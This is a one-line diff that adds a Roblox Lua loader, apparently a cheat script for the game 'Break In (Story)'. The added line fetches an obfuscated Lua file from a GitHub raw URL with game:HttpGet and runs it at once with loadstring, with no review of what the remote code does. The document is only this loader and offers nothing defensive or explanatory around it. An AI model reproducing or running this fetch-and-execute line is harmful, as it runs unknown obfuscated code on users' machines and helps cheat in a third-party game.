@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/XRoLLu/UWU/main/Break-In(Story)-X-Obfuscated.lua"))()
